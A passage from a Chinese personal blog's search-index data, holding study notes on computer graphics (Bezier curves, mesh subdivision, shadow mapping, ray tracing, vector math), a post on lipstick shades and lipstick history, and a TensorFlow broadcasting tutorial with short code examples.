File(.obj)Format 一种文本格式，用于记录一些特殊的点、法线、纹理坐标、和连接关系 例子中的文件描述了一个立方体，其中v开头的八行描述了立方体的八个顶点 其次一个立方体有六个面，即六个不同的朝向，也就是六个法线，vn开头的八行描述了该立方体的六条法线，由于自动建模，产生了冗余的行，实际只有6条法线，例如29和30行是一回事 一个面有4个点，总共24个，但涉及到点的共用最终只需要12个纹理坐标，（也可以将立方体展开理解），我们需要定义12个纹理坐标，vt开头的14行描述了12个纹理坐标（同样有冗余） 然后定义点的连接关系，f表示的12行定义了点的连接关系，即哪三个点会形成一个三角形格式为：f v/vt/vn，其中每一位的数字代表了对于集合中的第几个点/纹理坐标/法线 曲线Curves 贝塞尔曲线（Bezier Curves） 使用一系列的控制点来定义曲线 绘制方法：德卡斯特里奥（de Castelijau）算法生成二次贝塞尔曲线（quadratic Bezier） 对于三个点的贝塞尔曲线生成，过程如下： 定义三个点 根据任意t值插值出点 不断重复t在[0,1]间取值 得到曲线 二次贝塞尔曲线：递归 贝塞尔曲线代数表示 在每两个之间找一个时间t，相当于每两个之间线性插值 把算法过程携程代数形式： 不难发现该式形式符合一个二项分布多项式，推广到n阶可得： 三次贝塞尔曲线的代数表示： 贝塞尔曲线的性质 必过起点终点，起始切线方向为前两个点连接的方向，终止切线方向为结尾两个点连接的方向 对于三次贝塞尔曲线，其起始位置的切线一定是b′(0)=3(b1−b0);b′(1)=3(b3−b2)b&#x27;(0) = 3(b_1 - b_0);b&#x27;(1) = 3(b_3-b_2)b′(0)=3(b1​−b0​);b′(1)=3(b3​−b2​) 在仿射变换下，只需要对控制点做仿射变换再对变换后的控制点绘制贝塞尔曲线，就能得到这个贝塞尔曲线在仿射变换下的结果（但对投影不行 ） 凸包性质：贝塞尔曲线始终会在包含了所有控制点的最小凸多边形中, 而不是按照控制点的顺序围成的最小多边形 凸包：能包裹所有点的最小凸多边形 逐段贝塞尔曲线 控制点多了以后，贝塞尔曲线并不直观，很难控制，于是我们想到可以每次定义一段贝塞尔曲线，然后连起来 普遍习惯每四个控制点定义一段，并略去中间两点间的连线 连续性 C0C_0C0​连续：点相同 C1C_1C1​连续：切线向同 样子条曲线 样条：连续的曲线，由一系列控制点控制，满足一定的连续性，即可控的曲线 B样条曲线有关信息可以参考： https://zhuanlan.zhihu.com/p/50626506 https://www.bilibili.com/video/BV13441127CH?p=13 胡事民老师的课 曲面 贝塞尔曲面 u方向上画出四条贝塞尔曲线后，在这四个线上再取四个点，并认为这是个点是一组新的贝塞尔曲线的控制点，这些 点在空间内向v方向扫描，便形成了贝塞尔曲面 几何处理 曲面细分（Mesh subdivision） Loop细分（Loop subdivision） 以三角形面为例： 增多三角形数量 调整三角形的位置（即调整顶点的位置） 将顶点区分为新的顶点与旧的顶点 该算法规定，一般情况下（不考虑边缘情况），对于新顶点，位置由下左图规定，而对于旧顶点，需要由旧顶点和新顶点位置共同确定 下右图中，n为该顶点的度（依附于某个顶点的边的条数），u为一个和n有关的数 新顶点 旧顶点 Ctamull-Clark细分 loop细分有一个前提，即只适用于三角形网格，而对于非三角形网格的细分，就需要借助catmull-clark算法 该算法定义面分为两种——四边面和非四边面，并定义度为4的顶点为非奇异点，其余点均为奇异点 具体做法是，对每个非四边面都取其中的一个点（重心或者其他点），将其与该面的其他顶点分别连接，在这个过程中，会引入一个新的奇异点，并且在一次细分后，所有非四边面都变为了四边面，在后续的细分中，将不会引入新的奇异点 对于细分后顶点位置的调整，先将顶点分为三大类 ①新的在面上的点； ②新的在边上的点； ③旧的点如下计算 loop细分与catmull-clark细分不同的处理效果： 具体推导过程可以参考： https://blog.csdn.net/McQueen_LT/article/details/10610260 网格简化（Mesh simplification） 边坍缩 如何保证坍缩前后轮廓基本保持一致？ ——二次误差 二次误差度量：坍缩后的点和原本几个边（面）的距离的平方和最小 对每一条边都先计算一下二次误差，随后从二次误差最小的开始坍缩，由小到大 但这么做会引入一些问题：做一次坍缩后，其他边也跟着变了，他们的二次误差必须被重新计算 所以需要从二次度量误差中选最小的，取完最小的之后，我们要对它们的二次误差做一次更新，于是我们就要用到优先队列 / 堆这种数据结构，这种数据结构能让我们能取得二次误差最小值的同时也能动态更新其他受影响的元素 另外，这种通过对局部计算最优解，试图找到全局的最优解，是一个典型的贪心算法 网格正规化（Mesh regularization） 光线追踪 光栅化的着色是一种局部的现象，在其着色的过程中只会考虑着色点自己的信息，而不会考虑其他物体，甚至不会考虑物资自身的其他部分对着色点的影响。事实上这些都是会有遮挡的关系的，是会产生阴影的，为了解决这个问题，就有了光线追踪 引入 Shadow Mapping 阴影贴图 核心思想：如果一个点不在阴影里，那么这个点可以被摄像机和光源都看到 局限：硬阴影，走样，只能处理点光源 具体实现细节： ① 先从光源看向场景，做一遍光栅化，不进行着色，只记录深度 ② 再从摄像机看向场景，再做一遍光栅化，记录深度 ③ 比较两次深度值，如果不相等，则说明该点在阴影中 问题1：渲染出来的阴影比较脏 原因：深度值的比较位浮点数比较，而判断浮点数相等势必会产生误差，虽然处理精度的方法有很多种，但并不能从 本质上解决问题 问题2：走样 原因：本身储存的深度图存在分辨率限制，与渲染时的分辨率搭配不好的话，就会产生走样 关于硬软阴影：本质是本影和半影的问题，只要存在软阴影，那么光源一定具有一定的体积 Why Ray-Tracing？ 由上可知，光栅化并做不好全局的效果，如软阴影，反射，环境光照 光栅化很快速，但渲染的质量不高；光纤追踪的处理速度慢，但渲染的很准确 光栅化很容易做到实时，而光线追踪更多的应用于离线渲染（现在的实时光线追踪，这位更是重量级！） 首先定义光线——沿直线传播，不会发生碰撞，从光源到人眼 由光路的可逆性，在光线追踪的具体应用中，采用从人眼（认为是一个针孔摄像机）到光源的方法 光线投射：人眼，成像平面，光源，物体 Ray Casting 从相机出发投射一条光线，穿过成像平面，与着色点相连，如果光源能看见着色点（着色点不在阴影中），那么就生成一条有效光路，计算能量并着色（我们很容易知道这个着色点的法线，入射方向等信息，这时候可以用各种各样的 着色模型（如Blinn Phong）） 对于场景中的物体，我们假设光打到它之后会发生完美的折射与反射，而对于着色点，我们取光路与物体最近的交点 （涉及深度测试） 总的来说，光线投射其实就是每个像素投射出去一条光线，求到和场景内物体的最近交点，通过该交点和光源连线来 判定是否可见，然后算着色，写回像素的值 这个方法依旧只是弹射一次，但事实上光线是能在物体间弹射很多次，这时候就需要用到whitted光线追踪 Whitted（递归）风格光线追踪","categories":[{"name":"计算机图形学","slug":"计算机图形学","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"},{"name":"图形学入门","slug":"计算机图形学/图形学入门","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%A5%E9%97%A8/"},{"name":"Games101","slug":"Games101","permalink":"http://enderxiao.github.io/categories/Games101/"},{"name":"1-8","slug":"Games101/1-8","permalink":"http://enderxiao.github.io/categories/Games101/1-8/"}],"tags":[{"name":"计算机图形学","slug":"计算机图形学","permalink":"http://enderxiao.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"},{"name":"Games101","slug":"Games101","permalink":"http://enderxiao.github.io/tags/Games101/"}]},{"title":"月亮姑娘的颜色🌙","slug":"月亮姑娘的颜色🌙","date":"2022-03-13T03:26:27.000Z","updated":"2024-07-30T11:26:33.936Z","comments":true,"path":"2022/03/13/月亮姑娘的颜色🌙/","permalink":"http://enderxiao.github.io/2022/03/13/%E6%9C%88%E4%BA%AE%E5%A7%91%E5%A8%98%E7%9A%84%E9%A2%9C%E8%89%B2%F0%9F%8C%99/","excerpt":"接触一些之前没啥兴趣的东西，丰富自己的爱好，顺便训练以下学习方式","text":"接触一些之前没啥兴趣的东西，丰富自己的爱好，顺便训练以下学习方式 数据采集 grand color series character outlook Gucci #25 Goldie Red（橘调带粉） 碎花 Rouge à Lèvres Voile 活力，元气，少女妆 金底，白管带蔷薇碎花 Gucci #217 巴莱里亚玫瑰（#A94844） 2021圣诞限定古驰倾色绒雾唇膏Rouge à Lèvres Mat 哑光，接近唇色，低饱和度的粉色，棕色的基础上在蓝通道和绿通道上有所增加 金底，黑色管体，带交错排布的心和星星图案 Gucci #505 复古珍妮特（#992F2E） 倾色华缎Janet Rust, Rouge à Lèvres Satin 铁锈红棕色，颜色浓郁、饱和度高 金底，金色管体，带类似罗马柱上的花纹 Gucci #520 玛丽娜朱砂橘（#9D291F） 倾色丝润Janet Rust, Rouge à Lèvres Satin 2022年520限定，深橙色，易显色，适合薄涂 金底，米白管带蓝色蔷薇花束。 YSL 416 番茄红(#882C24) 黑管 VERNIS A LEVRES VINYL CREAM 明艳，活泼 通体黑色方管，YSLLogo靠上，下侧小窗看到颜色 LANCOME #288 橘咖小奶猫（#CC4242） 小蛮腰L’absolu Rouge Drama Ink 风干后回形成膜状，变为亚光质地，使得显色更持久，橘色带咖啡色，甜美，偏艳丽 兰蔻小蛮腰管，上半为黑色带金色LOGO，下班为毛玻璃效果 Joocyee(酵色) #V06枫糖番茄（#932017） 琥珀哑光Tortoise Shell Fluffy Matte Lipgloss 哑光，熟透了的番茄色 琥珀色长管，带琥珀纹路，表面哑光处理 Joocyee(酵色) #06脏脏奶咖（#8A2214） 贝壳镜面唇釉Spiral Shell Glazed Lipgloss 薄涂偏向于番茄色，厚涂部分偏向于深棕色，和名字很符合呢 白色长管，带高光纹路，底部为红色，连接部分带渐变。 Joocyee(酵色) #209西部世界（#8F352F） 白管 巧克力棕红色 白色短管，银色管口，底部头部，开口部位带银色高光环。打开管帽后，管口部分带有Joocyee Shu uemura(植村秀) OR 599落日黄昏（#C33831） 无色限绢感唇釉 番茄偏橙色，很像黄昏的颜色。不知道合不合适，但有的人总能让我想起黄昏，因为她会带来一天中最美丽的云，和优雅的月。也因为她让我感觉遥不可及转瞬即逝，却又想据为己有沉醉其中。 黑帽，帽顶带有LOGO，透明磨砂管 口红、唇釉、唇膏 口红发展 口红，是一种主要使用于嘴唇上并可以增加嘴唇的色泽或改变嘴唇的颜色的化妆品。口红是彩妆中重要的化妆品之一；主要成分包含了蜡、油和食用色素。最初的口红是膏状，与现今的唇蜜相似，子弹型的口红是在第一次世界大战时才发明的。 许多化妆品厂商会以颜色或流行的名称来为口红命名，第一个不以口红颜色为名而以号码行销的品牌是伊夫·圣罗兰。 来源——口红 - 维基百科，自由的百科全书 (wikipedia.org) 口红 苏美尔文明 目前已发现的世界上第一支口红来自苏美人，即苏美尔，美索不达米亚文明中最早的文明体系，也是世界最早产生的文明之一，起源不详发现地点：乌尔，今伊拉克境内，加尔省，幼发拉底河南部，犹太人的发源地乌尔是苏美尔王朝中将为强大的一个城邦，统一美索不达米亚平原三个朝代，随着乌尔第三王朝的灭亡，是史学家再未发现过苏美尔人建立的政权，即使苏美尔语和楔形文字再以后的巴比伦和亚述时期仍然存在。制备：苏美尔人将一些宝石敲碎，并用他们来装饰面部，主要是唇部和眼部[1]。 古埃及 古埃及常使用黑色、橙色、紫红色，作为区分权力和神职的象征，因此无论男女都会使用。古埃及人从墨角藻、0.01%碘和一些溴甘露醇中提取红色染料，但这些染料导致了一些很严重的疾病（例如溴化物引起的中毒）。Cleopatra克莉奥帕特拉七世，也就是著名的埃及艳后，据说她会将使用胭脂（Carmine）作为口红以得到她喜爱的洋红色，洋红色也同样是口红中最为经典的色号。而众所周知胭脂的早期制备方式是将胭脂虫的虫卵和尸体捣碎得到，英文Wiki中直接使用了这么一个句子来形容她的制备工艺： Cleopatra crushed bugs (carmine) to create a color of red on their lips.[2] 印度河流域文明 在该文明时空的人们，通过使用矩形赭石的斜切面来装饰他们的嘴唇[3]，印度《爱经》中描述了使用红紫胶和蜜蜡制成的唇彩及其使用方式[4] 古希腊时期 古希腊早期口红并不是一件受人待见的产品，原因是当时为了区分出妓女与普通工作者，这样一条法令被实施：妓女在公共场合必须画上足以表明身份的妆容，以避免公民受其诱惑。(有待考证，据了解古希腊妓女行业较为发达)。 罗马时期 这一时期口红再次成为全民追捧的物件，贵族们，无论男女，都会使用口红，其中有一种名为Fucus的口红，以紫色含汞的植物染液和红酒沉淀物制成，显然这种口红对身体的危害也极大。 古中国 口红在中国的使用已经延续了很多年，在中国一般称为口脂。1000多年前中国人使用蜂蜜支撑口红，以使得唇部维持娇嫩的状态。唐代时期，香油被加入其中。《齐民要术》中记载过相关的制作工艺：即先制香酒，以丁香、藿香两种香料，裹入新收无杂质的棉花中，投入事先烧至微烫的酒中，以热酒吸收棉中的香料之味，吸收的时间为夏日1天1夜，春、秋两季为两天两夜，冬季为3天3夜。浸透到期后，取出棉花和香料，将牛油或牛髓放人此香酒，旺火大烧，滚沸一次加一次牛油脂，数滚之后，撤火微煎，此时慢慢掺人以朱砂研取的红色颜料，并以青油调人，搅拌均匀，灭火后，待其自然冷却，凝成的红脂细腻鲜艳，香气蕴藉，即为妇女喜爱的饰唇用品了。古代男性同样会使用类似唇膏的口脂，但其功效更接近今天的唇膏，只是当时并不做刻意区分。 英国 唇彩在16世纪的英国开始逐渐被关注。早伊丽莎白一世时期，白皙的脸庞搭配艳丽的红唇称成为一种时尚，这可能与伊丽莎白一世当时的妆容有关，有现代观点认为伊丽莎白的死因是长期使用以碳酸铅为原料的铅粉美白肌肤，以含有汞的口红涂抹嘴唇导致的中毒。但该观点并没有得到认可，部分历史学家提出了证据不充分的反驳[5]、[6]。也有观点认为，伊丽莎白一世只是认为纯粹的美丽能供抵御死亡，每到生病或是精神萎靡时，都会大量使用口红。 17C 在文艺复兴思潮的影响下，欧洲的英国和法国男士间也流行涂抹口红。 18C-19C 18C的美国，从英国新教团移居美洲的清教徒之间并不流行涂抹口红，而19C流行苍白，在维多利亚女王丧夫后，时尚风潮趋于保守，以纤弱秀气、文静娴雅的淑女形象为美，口红和化妆品被视为禁忌，转而以药品形式销售。 20C 20C的美国接着第二次工业革命的春风，进入全面工业化、现代化，紧急飞速发展。为了满足人们的消费欲望，口红被美国人赋予了新的内核，淡化了她的宗教色彩，阶级划分，使其称为商品，一种消费习惯，甚至一种生活方式。1884年，娇兰生产了第一支商业口红，奠定了现代口红的外形。配方是由葡萄柚提取物，油脂和蜂蜡等调配而成。据说这款唇膏是像发蜡一样的质地及包装，膏体不能转出，需要用手或刷具来涂抹。其实在之前的1870年，娇兰也推出过世界首款以蜡为基底的管装唇膏。法国娇兰(Guerlain)将管状口红引进美国，贩售对象主要为少数贵族，第一支金属管口红是由美国康乃狄克州沃特伯里的毛里斯李维和史柯维尔制造公司(Maurice Levy and the Scovil Manufacturing Company)于1915年制造，属于大众化产品。1912年纽约妇女参政权论者的示威活动中，著名的女性主义者都抹上口红，把口红示为妇女解放的象征。1920年代的美国，由于电影的流行，也带动了口红的流行，其后各类口红颜色的流行都会受到影视明星的影响，而带动风潮。但当时的口红是以肥皂为基底，使用起来并不让人感到舒适。1923年，詹姆斯·布鲁斯·梅森(James Bruce Mason Jr.) 创造了第一款旋转式的唇膏，这款口红名为“梅森管”(Mason tube)，这种旋转式的口红管设计一直沿用到现在。但当时口红配方中的昆虫粉末、蜂蜡、橄榄油、黄油，猪油等成分，实在太容易变质，使用几个小时之后就失去效果。 二战 20C30年代的经济危机中，著名的“口红效应”向我们解释了为什么口红会卖得更好。1940年代的美国女性受到战争的影响，会以化妆来保持好脸色，当时最大的口红厂商之一Tangee，曾推出一个名为“战争、女人和口红”的广告。鼓励女性涂上明艳的口红，展现勇气和魅力，来激起举国昂扬的斗志。女性涂口红就是参与战争的有效方式。 战后至今 为了从战争的阴影中挣脱，娱乐行业的发展再一次推动了口红的发展，口红也不再是单调的红色，越来越多的颜色被加入到全家桶，例如暗色系口红的发展也离不开诸如Marilyn Manson（奏四唱Sweet Dream的辣个），这类朋克、哥特、重金属等等风格的歌手明星的推动。并且，除了在颜色上的创新，唇蜜，唇膏，唇釉等等产品也随之而来。 区分 口红的发展除了在颜色上有所增加以外，在形态上也有所变化，例如衍生产品唇蜜、唇釉唇彩等等。 口红、唇膏 唇膏就是最原始、最常见的口红，一般是固体，质地相对干硬，相对不够滋润，会有干巴巴的感觉，因此在涂唇膏之前必须先涂润唇蜜来给嘴唇保湿。 好处是色彩饱和度高，颜色遮盖力强，而且由于是固体一般不容易由于唇纹过深而外溢，适合用于修饰唇形、唇色。 唇蜜、唇彩 唇彩，棒状，带刷，一般唇彩的颜色相对于唇蜜比较厚，遮盖力较强，色彩比较丰富。固体唇彩和唇膏的效果类似。 唇彩除了常见的棒状液体唇彩之外，还有质地比较粘稠的半固体或固体唇彩，效果介于唇膏和唇彩中间，质地比较厚、粘稠一些的唇彩保持时间较久。 缺点：容易从唇纹里溢出，从而使嘴唇轮廓变模糊。 唇蜜，一般不单独使用的，因为颜色浅，跟口红一起使用的。如果嘴部发干，可先用唇蜜再用口红，这样定妆的效果也会有所提升。优点：滋润提亮。缺点：遮盖力比较差，单独使用的效果不理想。 唇釉 棒状，带刷，口红和唇蜜的结合品，既保留了唇膏的色彩鲜艳度，又兼备了唇蜜的滋润感。缺点：质地粘稠，不清爽。 参考文献 [1]Sarah E,Schaffer.Reading our lips: the history of lipstick regulation in Western seats of power.[J].Food and drug law journal,2007,62(1):165-225. [2]Valdesolo, Fiorella (2006), “The Red Army”, The New York Times, retrieved 2021-03-24 [3] Mackay, E.J.A. (1937). “Excavations at Chanhu-daro”. Journal of the Royal Society of Arts. 85 (4405): 527–545. [4] McConnachie, James (2007). The Book of Love: In Search of the Kamasutra. London: Atlantic Books. ISBN 978-1-84354-373-2. [5] Anna Riehl. The Face of Queenship: Early Modern Representations of Elizabeth I. 2010. ISBN 9780230106741. [6] Why is Elizabeth I always depicted as a grotesque?. Kate Maltby. 2015-05-25 [2019-10-05]. Even Venetian Ceruse, the notorious pale make-up used by Elizabethan actors and never found in the inventories of the queen herself, has been shown in reconstructions to blend lightly into the skin like a modern concealer…","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"口红","slug":"口红","permalink":"http://enderxiao.github.io/tags/%E5%8F%A3%E7%BA%A2/"},{"name":"唇釉","slug":"唇釉","permalink":"http://enderxiao.github.io/tags/%E5%94%87%E9%87%89/"},{"name":"发展史","slug":"发展史","permalink":"http://enderxiao.github.io/tags/%E5%8F%91%E5%B1%95%E5%8F%B2/"}]},{"title":"TensorFlow中的广播机制","slug":"TensorFlow中的广播机制","date":"2022-02-20T14:00:05.000Z","updated":"2024-07-30T11:26:33.915Z","comments":true,"path":"2022/02/20/TensorFlow中的广播机制/","permalink":"http://enderxiao.github.io/2022/02/20/TensorFlow%E4%B8%AD%E7%9A%84%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/","excerpt":"","text":"转载：tensorflow的广播机制 TensorFlow支持广播机制（Broadcast） TensorFlow支持广播机制（Broadcast），可以广播元素间操作(elementwise operations)。正常情况下，当你想要进行一些操作如加法，乘法时，你需要确保操作数的形状是相匹配的，如：你不能将一个具有形状[3, 2]的张量和一个具有[3,4]形状的张量相加。但是，这里有一个特殊情况，那就是当你的其中一个操作数是一个具有单独维度(singular dimension)的张量的时候，TF会隐式地在它的单独维度方向填满(tile)，以确保和另一个操作数的形状相匹配。所以，对一个[3,2]的张量和一个[3,1]的张量相加在TF中是合法的。（译者：这个机制继承自numpy的广播功能。其中所谓的单独维度就是一个维度为1，或者那个维度缺失） 1234567import tensorflow as tfa = tf.constant([[1., 2.], [3., 4.]])b = tf.constant([[1.], [2.]])# c = a + tf.tile(b, [1, 2])c = a + b 广播机制允许我们在隐式情况下进行填充（tile），而这可以使得我们的代码更加简洁，并且更有效率地利用内存，因为我们不需要另外储存填充操作的结果。一个可以表现这个优势的应用场景就是在结合具有不同长度的特征向量的时候。为了拼接具有不同长度的特征向量，我们一般都先填充输入向量，拼接这个结果然后进行之后的一系列非线性操作等。这是一大类神经网络架构的共同套路(common pattern) 12345678a = tf.random_uniform([5, 3, 5])b = tf.random_uniform([5, 1, 6])# concat a and b and apply nonlinearitytiled_b = tf.tile(b, [1, 3, 1])c = tf.concat([a, tiled_b], 2)d = tf.layers.dense(c, 10, activation=tf.nn.relu) 但是这个可以通过广播机制更有效地完成。我们利用事实f(m(x+y))=f(mx+my)f(m(x+y))=f(mx+my)，简化我们的填充操作。因此，我们可以分离地进行这个线性操作，利用广播机制隐式地完成拼接操作。 123pa = tf.layers.dense(a, 10, activation=None)pb = tf.layers.dense(b, 10, activation=None)d = tf.nn.relu(pa + pb) 事实上，这个代码足够通用，并且可以在具有抽象形状(arbitrary shape)的张量间应用： 1234567def merge(a, b, units, activation=tf.nn.relu): pa = tf.layers.dense(a, units, activation=None) pb = tf.layers.dense(b, units, activation=None) c = pa + pb if activation is not None: c = activation(c) return c 一个更为通用函数形式如上所述： 目前为止，我们讨论了广播机制的优点，但是同样的广播机制也有其缺点，隐式假设几乎总是使得调试变得更加困难，考虑下面的例子： 123a = tf.constant([[1.], [2.]])b = tf.constant([1., 2.])c = tf.reduce_sum(a + b) 你猜这个结果是多少？如果你说是6，那么你就错了，答案应该是12.这是因为当两个张量的阶数不匹配的时候，在进行元素间操作之前，TF将会自动地在更低阶数的张量的第一个维度开始扩展，所以这个加法的结果将会变为[[2, 3], [3, 4]]，所以这个reduce的结果是12. （译者：答案详解如下，第一个张量的shape为[2, 1]，第二个张量的shape为[2,]。因为从较低阶数张量的第一个维度开始扩展，所以应该将第二个张量扩展为shape=[2,2]，也就是值为[[1,2], [1,2]]。第一个张量将会变成shape=[2,2]，其值为[[1, 1], [2, 2]]。） 解决这种麻烦的方法就是尽可能地显示使用。我们在需要reduce某些张量的时候，显式地指定维度，然后寻找这个bug就会变得简单： 123a = tf.constant([[1.], [2.]])b = tf.constant([1., 2.])c = tf.reduce_sum(a + b, 0) 这样，c的值就是[5, 7]，我们就容易猜到其出错的原因。一个更通用的法则就是总是在reduce操作和在使用tf.squeeze中指定维度。 我遇到的情况 在我尝试使用广播机制时，对于如下测试用例： 12345678910# 广播机制, a和b规模不同，但可以进行加法print(&quot;---------------------广播机制---------------------&quot;)# a = tf.reshape(tf.range(8), (4, 2, 1))# b = tf.reshape(tf.range(4), (2, 1, 2))# print(a)# print(b)# print(a + b)x = tf.constant([[[1], [1]], [[2], [2]], [[3], [3]], [[4], [4]]])y = tf.constant([[[1, 1]], [[2, 2]]])print(x + y) 将会报如下错误： 12raise core._status_to_exception(e) from None # pylint: disable=protected-accesstensorflow.python.framework.errors_impl.InvalidArgumentError: Incompatible shapes: [4,2,1] vs. [2,1,2] [Op:AddV2] 可见只有维度值为1的维度才会被复制，就算上例中的x第一个维度时y的两倍。","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"TensorFlow","slug":"Python/TensorFlow","permalink":"http://enderxiao.github.io/categories/Python/TensorFlow/"}],"tags":[{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://enderxiao.github.io/tags/TensorFlow/"},{"name":"广播机制","slug":"广播机制","permalink":"http://enderxiao.github.io/tags/%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/"}]},{"title":"Games101_1TO8","slug":"Games101_1TO8","date":"2022-01-09T03:00:13.000Z","updated":"2024-07-30T11:26:33.908Z","comments":true,"path":"2022/01/09/Games101_1TO8/","permalink":"http://enderxiao.github.io/2022/01/09/Games101_1TO8/","excerpt":"下定决心开始学图形学","text":"下定决心开始学图形学 绪论 什么是图形学 从技术层面而言，画面越亮，全局光照越强，技术越好，画面越好 图形学的基本工业应用有如下一些场景： 游戏 电影 特效的制作，从某个方面来说特效是图形学中较好实现的，因为生活中比较少见 面部，动作捕捉 渲染 毛发，几何形体的表述 渲染，光纤在几何形体中的传播与反射 粒子效果，模拟与动画 设计 CAD设计 室内设计 可视化 人体可视化 VR 数字绘画 模拟 物理模拟 光线模拟 GUI Typography字体表示 The Quick Brown Fox Jumps Over The Lazy Dog，常用于测试字体的完整性，因为这一句话包含了所有26个字母 图形学中的问题 Math of （perspective）Projections, curves, surfaces Physics of lighting and shading Representing/Operating shapes in 3D Animation/Simulation 光栅化 将三维空间的几何形体显示在屏幕上的过程称为光栅化 常用于实时计算机图形学（例如游戏）。 在计算机图形学中实时意味着每秒钟生成30副图像（帧），就认为是实时，否则认为是离线 几何 Curves和Meshes的表示 即曲线与曲面的表示，在变化过程中如何保持曲线与曲面的拓扑结构 光纤追踪 Calculate Intersection and shading Continue to bounce the rays till they hit light sources 动画/仿真 Key frame Animation Mass-spring System CV与CG的区别 CG注重建模，模拟，CV注重图像处理（图像分割等设计猜测和推理的操作） 图形学中的线性代数 图形学主要基于以下自然学科： 基础数学： 线性代数 微积分 统计 基础物理 光学 力学 波动光学等等 其他 信号处理 数值分析（大量） 美学（一点点） 向量 数学上更习惯于称为向量 物理上更习惯于称为矢量 向量最重要的两个属性： 方向 长度 向量标准化 向量长度∣∣a⃗∣∣||\\vec {a}||∣∣a∣∣ 单位向量： 模长（magnitude）为1的向量 向量标准化：a^=a⃗/∣∣a⃗∣∣\\hat{a} = \\vec{a} / ||\\vec{a}||a^=a/∣∣a∣∣ 用于表示方向，不关心她的长度 向量加 平行四边形法则：向量首首相接的平行四边形对角线 三角形法则：向量首尾相接形成的三角形第三条边 在数学上的向量是基于一组基表示的，通常为笛卡尔基（即（1，0）与（0，1）），那么在这种情况下相加则为各坐标分量之和，便于计算向量长度。 向量乘法 点乘 a⃗⋅b⃗=∣a⃗∣∣b⃗∣cosθ\\vec{a} \\cdot \\vec{b} = |\\vec{a}||\\vec{b}|cos\\thetaa⋅b=∣a∣∣b∣cosθ 向量的点乘将得到一个数。 在图形学中，点乘可以用于计算出两个夹角的余弦，当两个向量均为单位向量时，点乘直接为夹角余弦： cosθ=a⃗⋅b⃗∣a⃗∣∣b⃗∣=a^⋅b^cos\\theta = \\frac{\\vec a \\cdot \\vec b}{|\\vec a||\\vec b|} = \\hat a \\cdot \\hat bcosθ=∣a∣∣b∣a⋅b​=a^⋅b^ 写成矩阵形式如下： a⃗⋅b⃗=a⃗Tb⃗\\vec a \\cdot \\vec b = {\\vec a}^T \\vec ba⋅b=aTb 点乘满足以下定律： 交换律 结合律 分配律 此外，点乘还能用于计算投影： $ \\vec {b_\\perp} = k \\hat a = |\\vec b| cos\\theta \\hat a = |\\vec b| (\\hat a \\cdot \\hat b) \\hat a$ 利用投影我们可以将一个向量分解为两个相互垂直的向量： 还能通过余弦相似度衡量两个向量的接近程度。 此外，考虑如下情况： 通过余弦函数对钝角与锐角的响应的正负不同，可以判断两个向量的方向是相同还是相反 叉乘 叉乘包括两个输入向量和一个输出向量。最终输出的向量为一个垂直于两个输入向量的新向量，且该向量的大小为： ∣a⃗×b⃗∣=∣a⃗∣∣b⃗∣sinϕ|\\vec a \\times \\vec b| = |\\vec a||\\vec b| sin \\phi∣a×b∣=∣a∣∣b∣sinϕ 其中ϕ\\phiϕ为向量夹角。 计算公式如下： a⃗×b⃗=(yazb−ybza,zaxb−xazb,xayb−yaxb)T\\vec a \\times \\vec b = (y_az_b - y_bz_a, z_ax_b - x_az_b, x_ay_b - y_ax_b)^Ta×b=(ya​zb​−yb​za​,za​xb​−xa​zb​,xa​yb​−ya​xb​)T 其中a⃗=(xa,ya,za),b⃗=(xb,yb,zb)\\vec a = (x_a,y_a,z_a), \\vec b = (x_b,y_b,z_b)a=(xa​,ya​,za​),b=(xb​,yb​,zb​) 还能使用矩阵表示法： a⃗×b⃗=A∗b=(0−zayaza0−xa−yaxa0)(xbybzb)\\vec a \\times \\vec b = A^{*}b = \\left( \\begin{matrix} 0 &amp; -z_a &amp; y_a \\\\ z_a &amp; 0 &amp; -x_a \\\\ -y_a &amp; x_a &amp; 0 \\\\ \\end{matrix} \\right) \\left( \\begin{matrix} x_b \\\\ y_b \\\\ z_b \\\\ \\end{matrix} \\right) a×b=A∗b=⎝⎛​0za​−ya​​−za​0xa​​ya​−xa​0​⎠⎞​⎝⎛​xb​yb​zb​​⎠⎞​ 其中A∗A^{*}A∗称为a的dual matrix。 输出向量的方向由右手准则确定。 在三位空间中，给定两个轴，可以使用叉乘计算出第三个轴。如果在一个三维坐标系中，x与y的叉乘得到z，则认为该坐标系为一个右手坐标系。 叉乘满足以下性质： a⃗×b⃗=−b⃗×a⃗\\vec a \\times \\vec b = -\\vec b \\times \\vec aa×b=−b×a a⃗×a⃗=0⃗\\vec a \\times \\vec a = \\vec 0a×a=0 a⃗×(b⃗+c⃗)=a⃗×b⃗+a⃗×c⃗\\vec a \\times (\\vec b + \\vec c) = \\vec a \\times \\vec b + \\vec a \\times \\vec ca×(b+c)=a×b+a×c 分配率 a⃗×(kb⃗)=k(a⃗×b⃗)\\vec a \\times (k\\vec b) = k (\\vec a \\times \\vec b)a×(kb)=k(a×b) 数乘结合律 在图形学中，可以利用叉乘来计算： 一个向量在另一向量的左侧还是右侧 一个向量在一个物体的内测还是外侧 例如对于如下一个x,y平面（z轴垂直于纸面），可以通过a⃗\\vec aa与b⃗\\vec bb的叉乘的正负判断b在a的左侧还是右侧： 再比如对于如下情况，如何判断P点是否在三角形ABC内部： 判断过程如下： 计算AB与AP的叉乘，得到方向为z轴正方向，P在AB左侧 计算BP与BC的叉乘，得到结果为z轴正方向，P在BC左侧 